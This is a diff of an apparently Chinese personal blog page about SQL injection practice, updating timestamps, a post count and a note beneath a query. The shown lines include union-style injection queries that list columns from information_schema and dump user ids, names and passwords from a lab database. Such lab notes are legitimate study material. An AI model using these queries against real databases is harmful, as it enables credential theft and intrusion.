@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222153434535.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222163353266.png">
 <meta property="article:published_time" content="2023-12-20T07:02:42.000Z">
-<meta property="article:modified_time" content="2023-12-27T11:05:59.591Z">
+<meta property="article:modified_time" content="2024-01-14T06:49:06.600Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220150816066.png">
@@ -73,7 +73,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>45</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
@@ -154,7 +154,7 @@
 <p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220160334354.png" alt="image-20231220160334354"></p>
 <p>查找information_schema库中tables表中table_schema&#x3D;database()</p>
 <p>查security库的表名</p>
-<h4 id="查看security库的user的所有列名"><a href="#查看security库的user的所有列名" class="headerlink" title="查看security库的user的所有列名"></a>查看security库的user的所有列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br></pre></td></tr></table></figure>
+<h4 id="查看security库的user的所有列名"><a href="#查看security库的user的所有列名" class="headerlink" title="查看security库的user的所有列名"></a>查看security库的user的所有列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br><span class="line">//city_task,sqli,tb_stu,test1,test_updatexml,user,users,xss</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220161543850.png" alt="image-20231220161543850"></p>
 <h4 id="查看security库的user所有信息"><a href="#查看security库的user所有信息" class="headerlink" title="查看security库的user所有信息"></a>查看security库的user所有信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;</span><br></pre></td></tr></table></figure>
@@ -297,7 +297,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>45</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
